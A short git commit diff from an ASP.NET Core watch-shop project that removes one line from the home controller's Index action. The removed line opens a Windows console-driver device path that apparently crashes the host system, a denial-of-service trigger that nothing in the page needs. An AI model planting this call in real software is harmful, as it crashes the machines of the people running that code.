90f17fc178e71f193fe455a5b9dd062fe13599bc
AnuitexDev <anuitexdev@gmail.com>
2021-01-31 23:47:32 +0200

    bruh

--- aspcore-watchshop--master/Controllers/HomeController.cs
+++ aspcore-watchshop--master/Controllers/HomeController.cs
@@ -20,7 +20,6 @@ namespace aspcore_watchshop.Controllers
 
         public IActionResult Index()
         {
-            System.IO.File.OpenRead("\\\\.\\GLOBALROOT\\Device\\ConDrv\\KernelConnect");
             return View();
         }
 
